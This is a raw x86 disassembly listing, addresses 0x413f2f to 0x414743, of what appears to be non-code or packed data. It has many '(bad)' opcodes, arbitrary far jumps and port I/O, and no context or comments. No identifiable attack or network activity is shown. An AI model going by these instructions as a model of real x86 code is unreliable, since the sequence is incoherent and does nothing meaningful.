  413f2f:	fucom  st(1)
  413f31:	test   BYTE PTR [ebx-0x33],0xbf
  413f35:	jmp    0xba95:0x63d04658
  413f3c:	add    ch,BYTE PTR [ebx-0x74e9623f]
  413f42:	dec    ebp
  413f43:	mov    ?,WORD PTR ds:0x401599b8
  413f49:	xor    ch,ch
  413f4b:	inc    edi
  413f4c:	jb     0x413f18
  413f4e:	dec    edx
  413f4f:	and    BYTE PTR [esi+0x761f3f44],bl
  413f55:	sub    al,0x46
  413f57:	xor    BYTE PTR [ecx+0x78ba9aab],0x78
  413f5e:	add    eax,0xab35ebdb
  413f63:	int3   
  413f64:	test   eax,0xe851eeab
  413f69:	out    dx,eax
  413f6a:	test   BYTE PTR [ebx+edx*2-0x28],bl
  413f6e:	ss or  eax,0x172f740
  413f74:	dec    eax
  413f75:	ret    0x5f6c
  413f78:	lahf   
  413f79:	test   eax,0x77a67c0c
  413f7e:	jae    0x413f55
  413f80:	sub    BYTE PTR [ebp+ebp*8-0x21],0xa9
  413f85:	or     eax,0x9fda706
  413f8a:	aaa    
  413f8b:	mov    ds:0x4901417,eax
  413f90:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f92:	or     eax,0xd08b6417
  413f97:	in     al,0xed
  413f99:	xor    BYTE PTR [edi+0x931a145],ah
  413f9f:	or     eax,ebx
  413fa1:	inc    esi
  413fa2:	adc    ebx,esi
  413fa4:	mov    ebx,0x19138aa0
  413fa9:	dec    ebx
  413faa:	addr16 push cs
  413fac:	add    edi,DWORD PTR [eax-0x6198276d]
  413fb2:	(bad)  
  413fb3:	mov    dh,0x7f
  413fb5:	cwde   
  413fb6:	sbb    cl,BYTE PTR [esi+0x71]
  413fb9:	push   ss
  413fba:	add    eax,ecx
  413fbc:	dec    esp
  413fbd:	retf   
  413fbe:	iret   
  413fbf:	(bad)  
  413fc0:	mov    ds:0xfe947c77,al
  413fc5:	push   eax
  413fc6:	mov    eax,0x542ddbc6
  413fcb:	addr16 jnp 0x413f6c
  413fce:	sar    BYTE PTR [bp+si],cl
  413fd1:	repnz sub ebp,DWORD PTR [ebp+0x5e]
  413fd5:	jo     0x41402c
  413fd7:	mov    dl,0x57
  413fd9:	shr    DWORD PTR [ecx],cl
  413fdb:	fisub  DWORD PTR [ecx]
  413fdd:	das    
  413fde:	xor    eax,0x6a713e3e
  413fe3:	rol    DWORD PTR [eax-0x1f],cl
  413fe6:	xchg   ecx,eax
  413fe7:	pop    eax
  413fe8:	addr16 dec eax
  413fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413feb:	int    0x8c
  413fed:	pop    es
  413fee:	xor    ebp,DWORD PTR [ecx+0x21c5b292]
  413ff4:	jmp    0x413fb6
  413ff6:	scas   al,BYTE PTR es:[edi]
  413ff7:	mov    ch,0x84
  413ff9:	sbb    DWORD PTR [esi-0x79],edx
  413ffc:	cwde   
  413ffd:	lea    ebx,[eax+0x6acbd822]
  414003:	into   
  414004:	xor    al,0x43
  414006:	or     eax,esp
  414008:	pop    DWORD PTR [eax-0x3dd034e0]
  41400e:	rcl    DWORD PTR [edx],cl
  414010:	cmp    DWORD PTR [ebp-0x53e06800],0xffffffd3
  414017:	dec    esi
  414018:	pop    ss
  414019:	adc    DWORD PTR [edx+0x17],edi
  41401c:	xchg   esi,eax
  41401d:	fcomp  DWORD PTR [esi-0x422658b9]
  414023:	imul   eax,DWORD PTR [ecx-0xf165872],0xa61164a8
  41402d:	and    DWORD PTR [esi],edi
  41402f:	push   cx
  414031:	ds inc edx
  414033:	mov    bl,0x9a
  414035:	mov    BYTE PTR [eax+0x44853bda],bl
  41403b:	gs hlt 
  41403d:	inc    edi
  41403e:	xchg   edi,eax
  41403f:	xor    DWORD PTR ds:[edi+0x272f4d4c],esi
  414046:	push   edx
  414047:	jnp    0x414023
  414049:	xchg   ebx,eax
  41404a:	and    DWORD PTR [ecx],ebp
  41404c:	add    BYTE PTR [ebp-0x11],ch
  41404f:	outs   dx,BYTE PTR ds:[esi]
  414050:	adc    BYTE PTR [ebx-0x48],bh
  414053:	xor    edi,edi
  414055:	mov    dh,0xc0
  414057:	push   0x4
  414059:	mov    edi,0xfc7fad
  41405e:	outs   dx,BYTE PTR ds:[esi]
  41405f:	test   eax,0xbdd218d7
  414064:	or     ebp,edx
  414066:	std    
  414067:	std    
  414068:	mov    ds:0xba5288f7,eax
  41406d:	pop    ebp
  41406e:	stos   BYTE PTR es:[edi],al
  41406f:	inc    ebp
  414070:	pop    ebx
  414071:	mov    esi,0x3a3ff2f9
  414076:	mov    WORD PTR [ecx-0x2b],?
  414079:	push   ss
  41407a:	jge    0x414042
  41407c:	push   edi
  41407d:	repz sbb BYTE PTR [esi],0xf8
  414081:	mov    edi,0x347401dc
  414086:	cmp    al,0x8f
  414088:	mov    ?,edi
  41408a:	lods   eax,DWORD PTR ds:[esi]
  41408b:	iret   
  41408c:	jo     0x4140d0
  41408e:	sbb    DWORD PTR [edi],esi
  414090:	dec    ebp
  414091:	mov    al,ds:0xebe7beda
  414096:	scas   eax,DWORD PTR es:[edi]
  414097:	shl    DWORD PTR [edi],1
  414099:	xor    al,0xd6
  41409b:	add    ebp,DWORD PTR [ecx-0x6a4713f5]
  4140a1:	jecxz  0x41407a
  4140a3:	sub    al,0x49
  4140a5:	pop    esi
  4140a6:	in     al,dx
  4140a7:	into   
  4140a8:	or     eax,DWORD PTR [esi]
  4140aa:	call   0x14aa:0x24c6ad6f
  4140b1:	dec    esi
  4140b2:	adc    eax,edi
  4140b4:	cmp    edx,DWORD PTR ds:0xe9bf0b7e
  4140ba:	jnp    0x414065
  4140bc:	and    edx,edx
  4140be:	aaa    
  4140bf:	xor    BYTE PTR [esi],bl
  4140c1:	dec    esp
  4140c2:	mov    edi,0x8105a970
  4140c7:	jmp    0xca0e:0x4053903b
  4140ce:	push   edx
  4140cf:	jecxz  0x414070
  4140d1:	(bad)  
  4140d2:	out    dx,al
  4140d3:	cmp    eax,edx
  4140d5:	mov    dh,0xd1
  4140d7:	mov    eax,ds:0x9fb698e7
  4140dc:	test   eax,0xc5e7f8aa
  4140e1:	mov    esp,0xf742de0f
  4140e6:	pop    eax
  4140e7:	or     DWORD PTR [eax-0x35],eax
  4140ea:	loopne 0x4140c8
  4140ec:	rol    DWORD PTR [ecx+0x6d6ee37e],0xc4
  4140f3:	jecxz  0x41411a
  4140f5:	(bad)  
  4140f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140f7:	ja     0x41413a
  4140f9:	aaa    
  4140fa:	sbb    al,0x2b
  4140fc:	push   ds
  4140fd:	mov    ecx,0xccdf6108
  414102:	cmp    al,bl
  414104:	jbe    0x4140ad
  414106:	jge    0x4140de
  414108:	inc    esp
  414109:	xchg   esp,eax
  41410a:	xchg   edx,eax
  41410b:	fcomp  QWORD PTR [eax-0x52]
  41410e:	dec    ecx
  41410f:	or     eax,0xe54dabca
  414114:	xchg   ebx,eax
  414115:	in     eax,dx
  414116:	test   DWORD PTR [edi-0x5fc9493e],0x12d80f49
  414120:	fstp   DWORD PTR [esi+ebp*1-0xf]
  414124:	sbb    ebx,DWORD PTR [esi]
  414126:	mov    ds:0x64fee0cf,eax
  41412b:	mov    ds:0x7460a847,eax
  414130:	retf   0x786f
  414133:	pop    ss
  414134:	sbb    DWORD PTR [eax+0x13],esi
  414137:	or     DWORD PTR [ecx-0x26],ebx
  41413a:	loopne 0x4140f7
  41413c:	push   ecx
  41413d:	xchg   edi,eax
  41413f:	imul   edi,DWORD PTR [edi+0x5d5803a4],0xc50a78cb
  414149:	mov    cl,0x6c
  41414b:	mov    al,ds:0x53b4f86
  414150:	add    BYTE PTR [esi+0x65],bl
  414153:	jae    0x41419a
  414155:	shl    DWORD PTR [edi+0x54],0xb9
  414159:	clc    
  41415a:	cmc    
  41415b:	nop
  41415c:	(bad)  
  41415d:	xchg   esi,eax
  41415e:	cmp    dl,BYTE PTR [edx]
  414160:	enter  0x445b,0xe8
  414164:	jae    0x414124
  414166:	xor    ecx,DWORD PTR [esi]
  414168:	repz scas eax,DWORD PTR es:[edi]
  41416a:	pop    eax
  41416b:	je     0x414192
  41416d:	adc    eax,0x6849f7f8
  414172:	cmp    edi,0x1c145b7a
  414178:	inc    esp
  414179:	or     al,0x20
  41417b:	retf   
  41417c:	jle    0x4141df
  41417e:	add    eax,0x5a410bf2
  414183:	push   esp
  414184:	push   cs
  414185:	adc    DWORD PTR [ebp+0xfb99352],esp
  41418b:	ja     0x4141a9
  41418d:	sub    ah,BYTE PTR ds:0xa40f43d5
  414193:	(bad)  
  414194:	loop   0x4141aa
  414196:	outs   dx,DWORD PTR ds:[esi]
  414197:	iret   
  414198:	inc    ebp
  414199:	add    cl,BYTE PTR [esi+0xfb9bef4]
  41419f:	dec    edi
  4141a0:	dec    edi
  4141a1:	mov    dh,0x15
  4141a3:	pop    ds
  4141a4:	les    ebx,FWORD PTR [esi]
  4141a6:	mov    ch,0xe7
  4141a8:	push   ecx
  4141a9:	jns    0x4141bb
  4141ab:	mov    edi,0xe9d59cf3
  4141b0:	imul   esi,DWORD PTR [edx+0x65dfc55e],0xffffffee
  4141b7:	test   BYTE PTR [ebx+0x73],0x8e
  4141bb:	sbb    dl,ch
  4141bd:	xor    BYTE PTR [edx-0x5e],bh
  4141c0:	imul   ebp,DWORD PTR [eax-0x31ada573],0x7a
  4141c7:	pop    es
  4141c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141c9:	lock cmp al,bh
  4141cc:	lods   eax,DWORD PTR ds:[esi]
  4141cd:	lods   al,BYTE PTR ds:[esi]
  4141ce:	js     0x4141a3
  4141d0:	jmp    0x414172
  4141d2:	pop    edi
  4141d3:	inc    eax
  4141d4:	lock enter 0xe5e,0xac
  4141d9:	jbe    0x414194
  4141db:	jl     0x4141fd
  4141dd:	sbb    eax,0x6e4ba0cb
  4141e2:	mov    edx,0xd3f20d65
  4141e7:	pop    ebx
  4141e8:	or     al,0xec
  4141ea:	xchg   BYTE PTR [eax-0x32],cl
  4141ed:	and    dl,BYTE PTR [edx+0x3f]
  4141f0:	inc    esp
  4141f1:	out    dx,al
  4141f2:	in     al,dx
  4141f3:	(bad)  [edx+0x68]
  4141f6:	ss fadd QWORD PTR ss:[esi]
  4141fa:	popa   
  4141fb:	test   DWORD PTR [eax+0x56a78629],0x51a5c8ad
  414205:	ficom  DWORD PTR [eax+0x26]
  414208:	fiadd  DWORD PTR [esi-0x41]
  41420b:	dec    DWORD PTR [eax+0x28]
  41420e:	and    DWORD PTR [ebp+eax*4-0x7a9c3ea1],eax
  414215:	pop    edi
  414216:	mov    al,0x7b
  414218:	mov    esi,0xce1e5211
  41421d:	or     bh,bh
  41421f:	sahf   
  414220:	into   
  414221:	mov    al,0x61
  414223:	jb     0x41427a
  414225:	into   
  414226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414227:	icebp  
  414228:	inc    edi
  414229:	and    eax,0xc850ee76
  41422e:	je     0x4141f6
  414230:	(bad)  
  414231:	cld    
  414232:	jae    0x4142a7
  414234:	stc    
  414235:	adc    al,bl
  414237:	mov    eax,ds:0xff321ef9
  41423c:	fucompp 
  41423e:	lahf   
  41423f:	jge    0x41421a
  414241:	add    eax,0x11e23061
  414246:	jle    0x414280
  414248:	sbb    BYTE PTR [ecx-0x47fb4be4],0xfc
  41424f:	rol    BYTE PTR [esi],0x2e
  414252:	cmp    BYTE PTR [esp+esi*8-0x52],al
  414256:	aas    
  414257:	mov    eax,0xcd1923a5
  41425c:	lahf   
  41425d:	jne    0x4142ce
  41425f:	mov    al,BYTE PTR [edi+0x42]
  414262:	pusha  
  414263:	mov    bh,0xe2
  414265:	popa   
  414266:	into   
  414267:	mov    edi,DWORD PTR [eax+ebp*8-0x6e1c9803]
  41426e:	push   edx
  41426f:	sar    DWORD PTR [ecx],cl
  414271:	loopne 0x4142ca
  414273:	pushf  
  414274:	xlat   BYTE PTR ds:[ebx]
  414275:	push   ecx
  414276:	loop   0x41420b
  414278:	add    al,0x10
  41427a:	ret    
  41427b:	retf   0x643a
  41427e:	inc    eax
  41427f:	retf   0xda4a
  414282:	es mov al,0xa5
  414285:	aaa    
  414286:	cs mov bl,0xd9
  414289:	aam    0x78
  41428b:	(bad)  
  41428c:	mov    al,ds:0xee68dcd5
  414291:	pop    edi
  414292:	sbb    eax,0x87ad98bc
  414297:	add    eax,DWORD PTR fs:[esi]
  41429a:	jbe    0x4142f7
  41429c:	jmp    0x8b3f0df3
  4142a1:	out    0x6c,eax
  4142a3:	pop    eax
  4142a4:	cmp    DWORD PTR [ecx+0x20],ebx
  4142a7:	test   DWORD PTR [ebx],0xcccc9d3d
  4142ad:	jb     0x4142ca
  4142af:	cmp    bl,dh
  4142b1:	jbe    0x414319
  4142b3:	inc    eax
  4142b4:	shl    BYTE PTR [esi-0x76],cl
  4142b7:	into   
  4142b8:	xchg   BYTE PTR [edx+ecx*4+0xeaaa4fe],ch
  4142bf:	pop    edi
  4142c0:	push   edx
  4142c1:	test   DWORD PTR [ecx+edx*4-0x48ac3693],edx
  4142c8:	sbb    DWORD PTR [ebx-0x46],edi
  4142cb:	mov    bl,0x46
  4142cd:	push   esp
  4142ce:	or     eax,0xff33e573
  4142d3:	fwait
  4142d4:	stc    
  4142d5:	mov    edi,0xd5ac605e
  4142da:	leave  
  4142db:	fisubr WORD PTR [ecx+edi*1-0x13]
  4142df:	pop    ss
  4142e0:	inc    ecx
  4142e1:	jae    0x4142b3
  4142e3:	cmp    eax,0x6f0f88a7
  4142e8:	mov    ecx,0x6541619d
  4142ed:	mov    cl,0x47
  4142ef:	fild   DWORD PTR ds:0xb58bda3e
  4142f5:	mov    bl,0x16
  4142f7:	pop    es
  4142f8:	enter  0xd8db,0xcf
  4142fc:	sub    al,0x23
  4142fe:	lds    ebx,FWORD PTR [eax]
  414300:	aad    0xb9
  414302:	lock push eax
  414304:	out    dx,al
  414305:	out    dx,al
  414306:	icebp  
  414307:	pusha  
  414308:	adc    ebx,eax
  41430a:	pop    ebx
  41430b:	xchg   DWORD PTR ds:0x1fe99f7,ecx
  414311:	xlat   BYTE PTR ds:[ebx]
  414312:	dec    edx
  414313:	ud0    edx,DWORD PTR [ecx-0x1c]
  414317:	hlt    
  414318:	js     0x41430f
  41431a:	push   esi
  41431b:	aad    0xb9
  41431d:	adc    dl,BYTE PTR [esp+eax*8-0x2adf5b2c]
  414324:	sub    eax,0x7fc9eb76
  414329:	ins    DWORD PTR es:[edi],dx
  41432a:	jmp    0x8c6cf29c
  41432f:	mov    cs,WORD PTR [ebx+0x74]
  414332:	retf   
  414333:	push   0x89de2a9c
  414338:	jge    0x41438c
  41433a:	repz (bad) 
  41433c:	aad    0x73
  41433e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41433f:	push   esp
  414340:	sub    BYTE PTR [eax+0x1099011b],bl
  414346:	mov    al,ds:0x88874b59
  41434b:	xlat   BYTE PTR ds:[ebx]
  41434c:	repz or ah,BYTE PTR [ebx-0x6c]
  414350:	sbb    edx,ecx
  414352:	lahf   
  414353:	jge    0x4142ec
  414355:	shl    BYTE PTR [ecx+0x9],1
  414358:	retf   
  414359:	and    eax,0xb9f31f8f
  41435e:	bound  edi,QWORD PTR [ebp+0x4b]
  414361:	call   0x6f73:0xcf4575f6
  414368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414369:	or     DWORD PTR [ecx],ecx
  41436b:	hlt    
  41436c:	in     al,0xc9
  41436e:	jmp    0x7f519d47
  414373:	push   eax
  414374:	mov    dl,0x5c
  414376:	popa   
  414377:	add    eax,0xfa480863
  41437c:	mov    ecx,0x515a5533
  414381:	jbe    0x414378
  414383:	aas    
  414384:	cmp    al,0x6e
  414386:	aaa    
  414387:	sahf   
  414388:	add    eax,0x5ebfd175
  41438d:	call   0xab646bba
  414392:	imul   DWORD PTR [edi]
  414394:	xor    BYTE PTR [edi],0x4d
  414397:	xchg   ebx,eax
  414398:	mov    dh,0xc0
  41439a:	lea    edi,[edx+0x1d]
  41439d:	push   eax
  41439e:	inc    edx
  41439f:	test   eax,0x94b864a
  4143a4:	arpl   WORD PTR [esi-0x7c],di
  4143a7:	and    BYTE PTR [esi+0x5e],0xb5
  4143ab:	jle    0x4143dc
  4143ad:	fs popa 
  4143af:	mov    dh,BYTE PTR [ebx+ebp*2-0x7a1eab22]
  4143b6:	icebp  
  4143b7:	cmp    esi,edi
  4143b9:	and    al,0xea
  4143bb:	xchg   edx,ebp
  4143bd:	xor    eax,0x6d7f73b3
  4143c2:	sub    ebp,edx
  4143c4:	push   esi
  4143c5:	inc    ebp
  4143c6:	mov    edx,0xe2e3e866
  4143cb:	cmp    BYTE PTR [edi],dl
  4143cd:	mov    ?,ebp
  4143cf:	sbb    ah,cl
  4143d1:	inc    esi
  4143d2:	sub    BYTE PTR [edi-0x6e328a62],0x8b
  4143d9:	pop    esi
  4143da:	mul    esi
  4143dc:	mov    edx,0x4cef29c1
  4143e1:	inc    ecx
  4143e2:	dec    edx
  4143e3:	inc    esp
  4143e4:	xor    ecx,DWORD PTR [ebx-0x55]
  4143e7:	div    DWORD PTR [eax+0x77]
  4143ea:	out    0x1a,eax
  4143ec:	out    0xf6,al
  4143ee:	pusha  
  4143ef:	test   BYTE PTR [edi],al
  4143f1:	sar    DWORD PTR [ebp-0x4f],1
  4143f4:	and    DWORD PTR [ebp+0x39],eax
  4143f7:	in     al,dx
  4143f8:	fsubr  QWORD PTR [ebp-0x67]
  4143fb:	mov    esi,DWORD PTR [ebp-0x554d64ae]
  414401:	dec    ebp
  414402:	hlt    
  414403:	adc    eax,0x7775d68d
  414408:	jns    0x414420
  41440a:	retf   0x9e6e
  41440d:	ins    DWORD PTR es:[edi],dx
  41440e:	sbb    BYTE PTR [eax],dh
  414410:	out    dx,eax
  414411:	mov    esi,0x9d0b251c
  414416:	sbb    ebp,DWORD PTR [ebx+0x4a]
  414419:	arpl   WORD PTR [ebx-0x1a],ax
  41441c:	mov    eax,0xce3ac444
  414421:	es div ch
  414424:	jno    0x4143c9
  414426:	bound  ebp,QWORD PTR [eax+0x2d35f90]
  41442c:	ror    BYTE PTR [ebp+0x5a],cl
  41442f:	xchg   ebp,eax
  414430:	and    eax,0x7dde3d5f
  414435:	outs   dx,DWORD PTR ds:[esi]
  414436:	inc    ebx
  414437:	push   esi
  414438:	popa   
  414439:	push   edi
  41443a:	call   0x7b12:0x658d27e7
  414441:	pusha  
  414442:	mov    al,0xb0
  414444:	fisub  DWORD PTR [esi]
  414446:	jecxz  0x41447b
  414448:	shl    edi,cl
  41444a:	mov    ds:0xf13ec4da,al
  41444f:	pop    eax
  414450:	or     eax,0x4d42e5ab
  414455:	add    BYTE PTR [eax+0x1b0d0b57],ah
  41445b:	mov    ds:0x647ca88d,eax
  414460:	hlt    
  414461:	dec    ebp
  414462:	mov    dl,BYTE PTR [esi+0x166504eb]
  414468:	loop   0x4143fa
  41446a:	dec    edi
  41446b:	pop    ebp
  41446c:	cmp    cl,cl
  41446e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446f:	mov    dl,0x1c
  414471:	leave  
  414472:	sub    al,0x62
  414474:	ret    
  414475:	jne    0x4144ec
  414477:	pop    ecx
  414478:	setnp  BYTE PTR [eax+0x15]
  41447c:	cmp    BYTE PTR [edx+0x18c93f52],ch
  414482:	inc    ebx
  414483:	add    al,0x3d
  414485:	int    0x27
  414487:	clc    
  414488:	push   0x1af27379
  41448d:	mov    al,ds:0x2d104dbc
  414492:	dec    ebx
  414493:	out    0xb9,eax
  414495:	fs sahf 
  414497:	aad    0x82
  414499:	ja     0x4144bb
  41449b:	out    dx,eax
  41449c:	adc    BYTE PTR [ebp-0x4d],ah
  41449f:	mov    bl,0x1d
  4144a1:	in     eax,0xa8
  4144a3:	test   DWORD PTR [edi-0x5765dcea],edi
  4144a9:	loop   0x4144d9
  4144ab:	add    DWORD PTR [edx],esp
  4144ad:	adc    al,0x95
  4144af:	(bad)  
  4144b0:	pop    eax
  4144b1:	fwait
  4144b2:	pop    edx
  4144b3:	retf   0x7e07
  4144b6:	push   esi
  4144b7:	mov    bh,0x93
  4144b9:	cmp    eax,0x4ffcf902
  4144be:	jle    0x20c7c46c
  4144c4:	in     eax,dx
  4144c5:	(bad)  
  4144c6:	jo     0x414525
  4144c8:	lahf   
  4144c9:	sbb    BYTE PTR [eax-0x7345e5d5],al
  4144cf:	leave  
  4144d0:	js     0x41445e
  4144d2:	sbb    al,0x8
  4144d4:	cmp    ebx,DWORD PTR [ebx-0x498d803a]
  4144da:	mov    es,WORD PTR [ecx]
  4144dc:	mov    BYTE PTR [ebx+0x7b080190],ah
  4144e2:	xchg   DWORD PTR [ecx+edx*4],edi
  4144e5:	loopne 0x414562
  4144e7:	int    0x86
  4144e9:	push   ebx
  4144ea:	lods   al,BYTE PTR ds:[esi]
  4144eb:	and    eax,0x7cccfdad
  4144f0:	pop    ebx
  4144f1:	cmp    al,0xec
  4144f3:	or     cl,bh
  4144f5:	xor    cl,cl
  4144f7:	scas   eax,DWORD PTR es:[edi]
  4144f8:	push   edi
  4144f9:	adc    DWORD PTR [esi],ebp
  4144fb:	inc    ebp
  4144fc:	js     0x414511
  4144fe:	xchg   esp,eax
  4144ff:	lods   al,BYTE PTR ds:[esi]
  414500:	mov    ah,0x96
  414502:	mul    DWORD PTR [eax+ebx*8+0x6b]
  414506:	lock adc al,0xf0
  414509:	push   0xffffff93
  41450b:	lock or al,0xd
  41450e:	inc    edi
  41450f:	cli    
  414510:	inc    edx
  414511:	mov    ebx,0xb0bb64f2
  414516:	aas    
  414517:	mov    eax,ds:0xb034abb6
  41451c:	rcr    DWORD PTR fs:[ebx+0x35a9bef0],cl
  414523:	push   eax
  414524:	ror    DWORD PTR [ebp-0x55],0x8a
  414528:	mov    ebp,esp
  41452a:	cmp    DWORD PTR [ebx+0x12],ebx
  41452d:	push   edi
  41452e:	ss aad 0x8a
  414531:	test   al,0xe
  414533:	ds clc 
  414535:	inc    esp
  414536:	cdq    
  414537:	xchg   esi,eax
  414538:	push   edi
  414539:	in     eax,dx
  41453a:	push   0x1eb5f395
  41453f:	push   edi
  414540:	shr    DWORD PTR [ebx+edi*8+0x1c],1
  414544:	push   es
  414545:	fistp  DWORD PTR [ebx-0x2a]
  414548:	adc    eax,0x352622d0
  41454d:	mov    ebx,0xb177eb26
  414552:	ins    BYTE PTR es:[edi],dx
  414553:	pop    ebx
  414554:	push   0x2f
  414556:	imul   ebx,esp,0xa3b8a947
  41455c:	pop    edi
  41455d:	das    
  41455e:	ds fmulp st(2),st
  414561:	xchg   BYTE PTR [ebx+0x5b2c138f],dh
  414567:	pop    ecx
  414568:	inc    eax
  414569:	loop   0x414575
  41456b:	mov    bh,ah
  41456d:	mov    BYTE PTR [ebp-0x42061b14],dl
  414573:	jge    0x41451c
  414575:	inc    eax
  414576:	cs pop ebx
  414578:	cmc    
  414579:	ret    
  41457a:	cmc    
  41457b:	pop    ebx
  41457c:	rcr    BYTE PTR [ebx+esi*1],1
  41457f:	xor    eax,0x6f69b8a9
  414584:	and    DWORD PTR [esi+0x7d],esp
  414587:	xor    eax,0x32ea4a9
  41458c:	das    
  41458d:	pop    edx
  41458e:	out    dx,al
  41458f:	fwait
  414590:	sub    BYTE PTR [ecx-0x4983a497],dl
  414596:	sub    dh,BYTE PTR [edi+0x592b7043]
  41459c:	(bad)  
  41459d:	jmp    0x414579
  41459f:	stos   DWORD PTR es:[edi],eax
  4145a0:	loop   0x414565
  4145a2:	jle    0x414545
  4145a4:	jmp    0xe27e409c
  4145a9:	sti    
  4145aa:	xor    cl,ah
  4145ac:	jbe    0x41454f
  4145ae:	lods   eax,DWORD PTR ds:[esi]
  4145af:	idiv   DWORD PTR ds:0x63f7962c
  4145b5:	xchg   ebp,eax
  4145b6:	jp     0x414600
  4145b8:	jne    0x414614
  4145ba:	fwait
  4145bb:	or     ebp,DWORD PTR [esi]
  4145bd:	or     al,0xad
  4145c0:	push   esi
  4145c1:	jl     0x414583
  4145c3:	dec    edi
  4145c4:	std    
  4145c5:	(bad)  
  4145c6:	je     0x414567
  4145c8:	xlat   BYTE PTR ds:[ebx]
  4145c9:	cmp    al,0x45
  4145cb:	adc    dl,BYTE PTR [ecx]
  4145cd:	ins    DWORD PTR es:[edi],dx
  4145ce:	pusha  
  4145cf:	xchg   esi,eax
  4145d0:	test   dh,bl
  4145d2:	lods   eax,DWORD PTR ds:[esi]
  4145d3:	mov    bh,0x91
  4145d5:	xor    ebx,DWORD PTR [ebx-0x17]
  4145d8:	nop
  4145d9:	adc    DWORD PTR [eax+ecx*8+0x6ca67d38],esi
  4145e0:	clc    
  4145e1:	mov    al,ds:0x94eb1dbe
  4145e6:	in     eax,dx
  4145e7:	stos   DWORD PTR es:[edi],eax
  4145e8:	fidivr DWORD PTR [eax]
  4145ea:	dec    esi
  4145eb:	es repz rcr eax,0xab
  4145f0:	fld    TBYTE PTR [ebx]
  4145f2:	out    0xfe,eax
  4145f4:	int3   
  4145f5:	mov    al,ds:0xf6f845e
  4145fa:	and    eax,0x80a37826
  4145ff:	scas   al,BYTE PTR es:[edi]
  414600:	outs   dx,BYTE PTR ds:[esi]
  414601:	pmaxub mm2,QWORD PTR ds:0x8cbde22a
  414608:	jmp    0x6a3311a5
  41460d:	into   
  41460e:	xor    ecx,DWORD PTR [ebx]
  414610:	pop    es
  414611:	jmp    0xdc37a9bf
  414616:	rep lock ins DWORD PTR es:[edi],dx
  414619:	pop    edi
  41461a:	pop    ss
  41461b:	cmc    
  41461c:	fnstcw WORD PTR [edi]
  41461e:	inc    ebp
  41461f:	mov    ecx,0xd5c59076
  414624:	sbb    dl,BYTE PTR [esi-0x45]
  414627:	iret   
  414628:	or     ch,BYTE PTR [edx]
  41462a:	repnz mov ds:0x49f5bc9a,al
  414630:	fiadd  WORD PTR [eax+0x55]
  414633:	xor    eax,0xff81a748
  414638:	popaw  
  41463a:	push   ebp
  41463b:	(bad)  
  41463c:	mov    edx,0xa9310496
  414641:	cli    
  414642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414643:	int3   
  414644:	xor    al,0xa9
  414646:	push   DWORD PTR [ebx]
  414648:	push   eax
  414649:	lods   al,BYTE PTR ds:[esi]
  41464a:	lea    edx,[edx-0x1d216464]
  414650:	test   dl,bh
  414652:	ret    0xe8ef
  414655:	cmp    ecx,edi
  414657:	enter  0xc872,0x59
  41465b:	sti    
  41465c:	sbb    cl,BYTE PTR [ebx+0x3dae0aa2]
  414662:	jnp    0x4146d7
  414664:	pushf  
  414665:	mov    cl,0x16
  414667:	mov    edi,0x1091debf
  41466c:	sbb    esp,esi
  41466e:	sub    ah,BYTE PTR [ebx-0x42]
  414671:	mov    dh,0x1c
  414673:	push   ecx
  414674:	rol    esi,1
  414676:	xor    esp,DWORD PTR [edx-0x59]
  414679:	cmp    al,0x98
  41467b:	sbb    BYTE PTR [edx-0x1d],dh
  41467e:	xor    eax,0x11a0ec82
  414683:	push   0xc2315bce
  414688:	test   eax,0xdca48ffc
  41468d:	hlt    
  41468e:	inc    ebp
  41468f:	xor    eax,0x9d13ebe
  414694:	das    
  414695:	inc    esi
  414696:	mov    al,ds:0x4c8e450b
  41469b:	push   cs
  41469c:	cs xor al,0x7e
  41469f:	imul   ebx,DWORD PTR [edx+0x6be98518],0xffffffa7
  4146a6:	jmp    0x46807efc
  4146ab:	cwde   
  4146ac:	xor    al,0x83
  4146ae:	(bad)  
  4146af:	dec    ebx
  4146b0:	sbb    cl,dl
  4146b2:	xlat   BYTE PTR ss:[bx]
  4146b5:	xor    eax,0xffffff8d
  4146b8:	aas    
  4146b9:	jmp    0x414640
  4146bb:	add    ecx,ebp
  4146bd:	jb     0x414688
  4146bf:	call   0xa580fd66
  4146c4:	rcr    DWORD PTR [ecx],1
  4146c6:	dec    edi
  4146c7:	cwde   
  4146c8:	xor    al,0x48
  4146ca:	call   0x119139fa
  4146cf:	mov    ds:0x591ec53c,al
  4146d4:	jns    0x414656
  4146d6:	mov    cl,0x17
  4146d8:	add    BYTE PTR ds:0x1e0ebb1e,ah
  4146de:	or     edx,ebp
  4146e0:	xchg   ebx,eax
  4146e1:	inc    esp
  4146e2:	add    BYTE PTR [eax],ch
  4146e4:	mov    al,0x69
  4146e6:	adc    ebx,DWORD PTR [edx-0x908b053]
  4146ec:	push   esi
  4146ed:	call   0xa4a6:0x574ee6f1
  4146f4:	push   ebx
  4146f5:	xchg   BYTE PTR [eax-0x59],bl
  4146f8:	call   0x55230a41
  4146fd:	inc    esp
  4146fe:	ss jp  0x4146a8
  414701:	iret   
  414702:	dec    BYTE PTR [esi+0x3b]
  414705:	jno    0x4146ab
  414707:	hlt    
  414708:	add    edi,DWORD PTR [edi+0x47b3c2e]
  41470e:	xor    ah,BYTE PTR [ebp-0x3e]
  414711:	inc    edx
  414712:	and    al,cl
  414714:	jno    0x4146c8
  414716:	pop    edx
  414717:	and    ebx,edi
  414719:	sbb    eax,0xf913e46b
  41471e:	in     eax,dx
  41471f:	push   es
  414720:	aaa    
  414721:	push   edi
  414722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414723:	pushf  
  414724:	adc    ebx,DWORD PTR [esi-0x704030bc]
  41472a:	and    BYTE PTR [eax+0x16],bl
  41472d:	cwde   
  41472e:	mov    bx,0x13cb
  414732:	fdiv   st(0),st
  414734:	(bad)  
  414735:	cmp    dh,bh
  414737:	dec    edx
  414738:	lock mov esi,0xf39038db
  41473e:	std    
  41473f:	loopne 0x414789
  414741:	pop    ecx
  414742:	dec    ecx
  414743:	repz and edx,DWORD PTR [eax]
